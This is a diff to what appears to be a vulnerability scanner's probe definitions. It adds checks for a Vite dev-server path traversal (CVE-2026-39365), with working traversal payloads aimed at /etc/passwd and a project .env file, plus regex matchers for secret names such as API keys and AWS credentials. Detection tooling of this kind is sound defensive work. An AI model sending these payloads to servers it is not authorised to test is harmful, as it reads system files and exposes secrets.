@@ -281,6 +281,35 @@
           }
         }
       ]
+    },
+    "vite_devserver_optimized_deps_path_traversal_2026": {
+      "description": "CVE-2026-39365 — Vite development server path traversal via the .map source-map handler under /node_modules/.vite/deps. Optimized-deps cache lookup accepts ../ in the requested path, escaping the cache root and reading arbitrary files (config, .env, /etc/passwd on Unix). Dev-mode only — production builds aren't affected. Surfaces when developers expose Vite dev (default :5173) to LAN or accidentally to internet.",
+      "tech_match": ["vite", "vue-cli", "svelte-kit", "qwik", "astro"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/node_modules/.vite/deps/../../../../../etc/passwd.map",
+          "description": "Linux path-trav canary via the .map handler — vulnerable Vite returns /etc/passwd as if it were a source-map.",
+          "matchers": [
+            {"type": "regex", "pattern": "root:x:0:0:|daemon:x:1:1:"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 75,
+          "variables": {"path_override": true}
+        },
+        {
+          "payload": "/node_modules/.vite/deps/..%2F..%2F..%2F..%2F.env.map",
+          "description": "URL-encoded ../ traversal pointing at a project .env. Confirms exposed Vite dev + path-trav even when raw / is filtered.",
+          "matchers": [
+            {"type": "regex", "pattern": "(?:DATABASE_URL|API_KEY|SECRET_KEY|JWT_SECRET|AWS_ACCESS_KEY)\\s*="},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {"path_override": true}
+        }
+      ]
     }
   }
 }
